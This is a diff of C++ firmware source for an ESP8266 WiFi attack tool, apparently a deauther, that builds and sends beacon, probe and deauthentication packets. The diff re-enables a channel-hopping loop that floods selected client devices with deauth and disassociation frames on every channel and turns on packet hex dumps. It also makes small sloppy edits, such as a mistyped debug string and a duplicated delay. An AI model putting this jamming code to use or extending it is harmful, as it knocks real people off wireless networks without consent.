@@ -9,7 +9,7 @@ Attack::Attack()
 void Attack::generate()
 {
 	if ( debug ) {
-		Serial.print ( "\n generating MACs..." );
+		Serial.print ( "\n[+] Generating MACs" );
 	}
 	
 	Mac     _randomBeaconMac;
@@ -72,7 +72,6 @@ void Attack::buildBeacon ( Mac _ap, String _ssid, int _ch, bool encrypt )
 	}
 	
 	for ( int i = 0; i < 6; i++ ) {
-		//set source (AP)
 		packet[10 + i] = packet[16 + i] = _ap._get ( i );
 	}
 	
@@ -139,18 +138,17 @@ void Attack::buildProbe ( String _ssid, Mac _mac )
 bool Attack::send()
 {
 	if ( wifi_send_pkt_freedom ( packet, packetSize, 0 ) == -1 ) {
-		/*
 		  if(debug){
-		  Serial.print(packetSize);
-		  Serial.print(" : ");
-		  PrintHex8(packet, packetSize);
-		  Serial.println("");
+        Serial.print(packetSize);
+        Serial.print(" : ");
+        PrintHex8(packet, packetSize);
+        Serial.println("");
 		  }
-		*/
 		return false;
 	}
 	
-	delay ( 1 );  //less packets are beeing dropped
+	delay (1);
+  delay (1);
 	return true;
 }
 
@@ -160,12 +158,12 @@ void Attack::changeRandom ( int num )
 	randomInterval = num;
 	
 	if ( debug ) {
-		Serial.println ( "changing randomMode: " + ( String ) randomMode );
+		Serial.println ( "[+] Changing randomMode: " + ( String ) randomMode );
 	}
 	
 	if ( randomMode ) {
 		if ( debug ) {
-			Serial.println ( " generate random SSIDs" );
+			Serial.println ( "enerate random SSIDs" );
 		}
 		
 		ssidList.clear ();
@@ -217,19 +215,20 @@ void Attack::run()
 				for ( int i = 0; i < clientScan.results; i++ ) {
 					if ( clientScan.getClientSelected ( i ) ) {
 						_selectedClients++;
-						/*if (settings.channelHop) {
-						  for (int j = 1; j < maxChannel; j++) {
-						  wifi_set_channel(j);
-						
-						  buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
-						  if (send()) packetsCounter[0]++;
-						
-						  buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
-						  if (send()) packetsCounter[0]++;
-						  }
-						  } else {*/
-						sendDeauths ( _ap, clientScan.getClientMac ( i ) );
-						//}
+						  if (settings.channelHop) {
+                for (int j = 1; j < maxChannel; j++) {
+                wifi_set_channel(j);
+
+                buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
+                if (send()) packetsCounter[0]++;
+
+                buildDeauth(_ap, clientScan.getClientMac(i), 0xa0, settings.deauthReason );
+                if (send()) packetsCounter[0]++;
+                }
+                } 
+                else {
+                  sendDeauths ( _ap, clientScan.getClientMac ( i ) );
+            }
 					}
 				}
 				
@@ -245,7 +244,7 @@ void Attack::run()
 		packetsCounter[0] = 0;
 		
 		if ( debug ) {
-			Serial.println ( " done" );
+			Serial.println ( "[I] Done" );
 		}
 		
 		if ( settings.attackTimeout > 0 ) {
@@ -290,7 +289,7 @@ void Attack::run()
 		}
 		
 		if ( debug ) {
-			Serial.println ( " done" );
+			Serial.println ( "[I] Done" );
 		}
 		
 		if ( settings.attackTimeout > 0 ) {
@@ -304,7 +303,7 @@ void Attack::run()
 	/* =============== Probe Request Attack =============== */
 	if ( isRunning[2] && currentMillis - prevTime[2] >= 1000 ) {
 		if ( debug )
-		{ Serial.print ( "running " + ( String ) attackNames[2] + " attack..." ); }
+		{ Serial.print ( "[I] Running " + ( String ) attackNames[2] + " attack..." ); }
 		
 		prevTime[2] = millis ();
 		
@@ -347,7 +346,7 @@ void Attack::run()
 		
 		if ( randomCounter >= randomInterval ) {
 			if ( debug ) {
-				Serial.println ( " generate random SSIDs" );
+				Serial.println ( "[+] Generate random SSIDs" );
 			}
 			
 			ssidList.clear ();
@@ -444,7 +443,7 @@ void Attack::_log ( int num )
 size_t Attack::getSize()
 {
 	if ( apScan.selectedSum == 0 ) {
-		stati[0] = "No network(s)";
+		stati[0] = "No network";
 	}
 	
 	size_t  jsonSize = 0;
@@ -633,7 +632,8 @@ void Attack::refreshLed()
 			numberRunning++;
 		}
 		
-		//if(debug) Serial.println(numberRunning);
+		if(debug) 
+      Serial.println(numberRunning);
 	}
 	
 	if ( numberRunning >= 1 && settings.useLed ) {
